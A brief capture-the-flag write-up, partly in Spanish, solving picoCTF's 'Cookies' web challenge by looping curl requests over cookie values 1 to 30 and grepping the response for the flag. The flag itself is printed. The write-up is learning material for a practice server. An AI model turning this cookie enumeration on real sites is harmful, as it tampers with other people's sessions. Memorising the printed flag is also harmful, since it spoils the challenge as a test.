## Cookies

## Descripcion
Who doesn't love cookies? Try to figure out the best one. http://wily-courier.picoctf.net:63228/
## Solucion
```
┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$ for i in {1..30}; do curl -s http://wily-courier.picoctf.net:57920/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

## Notas
- la pagina del reto pide que pongamos una cookie y dependiendo de si existe o no en la cookie pone un valor, entonces por ejemplo la biscotti cookie era la 10 y el chiste es que en algun numero esta la bandera, para eso hicimos el ciclo for que revise 30 galletas y cuando encuentre la bandera no la muestre con el grep: picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

## Referencias
- 